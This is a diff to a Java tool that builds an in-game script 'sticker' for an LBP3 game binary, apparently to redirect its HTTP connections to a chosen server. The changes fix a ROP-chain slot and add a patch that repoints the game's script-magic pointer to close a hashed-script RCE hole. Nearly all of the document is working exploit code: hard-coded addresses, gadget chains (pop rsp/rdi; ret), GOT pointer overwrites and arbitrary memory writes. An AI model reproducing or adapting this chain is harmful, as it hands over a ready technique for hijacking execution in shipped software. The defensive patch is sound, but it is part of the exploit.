@@ -128,6 +128,12 @@ public final class BuildSticker {
 
     /* ====================== 1. addresses in the 1.28 EBOOT ====================== */
 
+    static final long PTR_SCRIPT_MAGIC = 0x014714F8L;   // -> "FSHbFSHt" used to validate ".ff" resources
+    static final long SCRATCH_ZEROS = 0x017C8010L;      // 8+ zero bytes (free space next to SCRATCH_ROP)
+
+    /** Set from --keep-rce-patch in main(); only useful while debugging the script itself. */
+    static boolean keepRcePatch = false;
+
     static final long LEAK_POINTER_VALUE = 0x0148A4F0L;  // what *(World+0xAD0) points at
     static final long HTTPS_STRING       = 0x0124B207L;  // "HTTPS"
 
@@ -195,6 +201,7 @@ public final class BuildSticker {
 
     public static void main(String[] args) throws Exception {
         for (String a : args) if (a.equals("--keep-headers")) keepHeaders = true;
+        for (String a : args) if (a.equals("--keep-rce-patch")) keepRcePatch = true;
 
         String arg = null;
         for (String a : args) if (!a.startsWith("-")) { arg = a; break; }
@@ -223,6 +230,7 @@ public final class BuildSticker {
         System.out.println("  revision    : " + REVISION + "  (head 0x" + Integer.toHexString(REV_HEAD)
                 + ", branch 0x" + Integer.toHexString(REV_BRANCH) + ":" + REV_BRANCH_REV + ")");
         System.out.println("  header patch: " + (keepHeaders ? "disabled (--keep-headers)" : "enabled"));
+        System.out.println("  RCE patch   : " + (keepRcePatch ? "disabled (--keep-rce-patch)" : "enabled (0x014714F8 -> zeroes)"));
         System.out.println();
 
         RScript script = buildScript();
@@ -355,8 +363,11 @@ public final class BuildSticker {
 
         /* ---------- B. build the ROP chain ---------- */
 
-        int rTmpl = alloc();
-        readU32(DATA_TMPL_ID, rTmpl, "tmplId = *(0x01590EF0)");
+        // Slot 3 is a 64-bit ROP word, so it must hold an ADDRESS, not a 32-bit value.
+        // The old code loaded *(0x01590EF0) (the tmplId itself) and passed the integer 2 as the
+        // chain entry, so sceHttpCreateConnection received garbage. Dereference the slot instead,
+        // the same way ROP_CREATE_CONN_SLOT / ROP_SET_COOKIES_SLOT already do.
+        int rTmpl = gotPtr(DATA_TMPL_ID);
 
         emit(lci(alloc(), 0), "NOP placeholder (see writeString)");
         writeString(SCRATCH_SERVER, domain);
@@ -368,7 +379,7 @@ public final class BuildSticker {
         //   rop[3]  = tmplId              (read from 0x01590EF0 above)
         //   rop[12] = *sceHttpCreateConnection  (dereference the GOT slot)
         //   rop[21] = *sceHttpSetCookieEnabled  (dereference the GOT slot)
-        patchRopSlot(3, rTmpl, "tmplId");
+        patchRopSlot(3, rTmpl, "*tmplId");
         patchRopSlot(ROP_CREATE_CONN_SLOT, gotPtr(PTR_CREATE_CONN), "sceHttpCreateConnection (GOT)");
         if (ROP_SET_COOKIES_SLOT >= 0)
             patchRopSlot(ROP_SET_COOKIES_SLOT, gotPtr(PTR_SET_COOKIES), "sceHttpSetCookieEnabled (GOT)");
@@ -435,6 +446,19 @@ public final class BuildSticker {
         if (!keepHeaders) {
             writePtr(PTR_ADD_HEADER, G_XOR_EAX_RET, "sceHttpAddRequestHeader := xor eax,eax ; ret");
         }
+
+        /* ---------- E. close the RCE hole (Part E, problem 3) ---------- */
+
+        // LBP3 decides whether a resource is a loadable script by reading the 8-byte magic at the
+        // pointer stored in 0x014714F8 (normally "FSHbFSHt"). Repointing it at scratch memory
+        // that is all zeroes makes every *new* script fail that check, so a hashed script cannot
+        // be injected this way any more. Scripts already loaded keep running - which is why the
+        // plan must carry the game's existing GUID scripts, otherwise the sticker itself is
+        // rejected and silently does nothing.
+        //
+        // This must run LAST: everything above is patching done by this very script, and the
+        // check is only consulted when the game next loads a script resource.
+        if (!keepRcePatch) patchScriptMagic();
 
         emit(ret(0, T_VOID), "RETURN");
 
@@ -622,6 +646,27 @@ public final class BuildSticker {
                 "SET_RP_MEMBER r" + (rNext - 1) + ".<url null> (s32), r" + z);
     }
 
+    /**
+     * Part E, problem 3: repoint 0x014714F8 at eight zero bytes.
+     *
+     * The slot holds a 64-bit pointer to the "FSHbFSHt" magic string that LBP3 checks when it
+     * loads a script resource. Pointing it at zeroes makes the magic comparison fail for every
+     * script loaded from here on, retiring the hashed-script RCE vector, while scripts that are
+     * already resident keep running.
+     *
+     * Order matters: zero the memory first, then publish the pointer, so there is no window in
+     * which the slot points at a half-written value.
+     */
+    static void patchScriptMagic() {
+        for (int i = 0; i < 8; i++) {
+            loadAddr(SCRATCH_ZEROS + i);
+            emit(setRpMember(rNext - 1, FIELD_REF, R_ZERO, T_S32),
+                    "SET_RP_MEMBER r" + (rNext - 1) + ".<rce patch> (s32), r" + R_ZERO + "   ; 0 at 0x"
+                            + Long.toHexString(SCRATCH_ZEROS + i));
+        }
+        writePtr(PTR_SCRIPT_MAGIC, SCRATCH_ZEROS, "script magic ptr := zeroed scratch (RCE patch)");
+    }
+
     /* ================================================================== *
      *  6. ROP chain
      * ================================================================== */
@@ -637,7 +682,7 @@ public final class BuildSticker {
      *   0: pop rsp ; ret
      *   1: -> chain + 16
      *   2: pop rdi ; ret
-     *   3: RUNTIME  tmplId
+     *   3: RUNTIME  *0x01590EF0  (GOT-style dereference of the tmplId slot)
      *   4: pop rsi ; ret
      *   5: *server
      *   6: pop rdx ; ret
@@ -679,7 +724,7 @@ public final class BuildSticker {
         entry(SCRATCH_ROP + 16, "  -> chain + 16", false);
 
         entry(G_POP_RDI_RET, "pop rdi ; ret", true);
-        entry(0, "  tmplId                       [RUNTIME]", false);
+        entry(0, "  *tmplId                       [RUNTIME]", false);
         entry(G_POP_RSI_RET, "pop rsi ; ret", true);
         entry(SCRATCH_SERVER, "  *server", false);
         entry(G_POP_RDX_RET, "pop rdx ; ret", true);
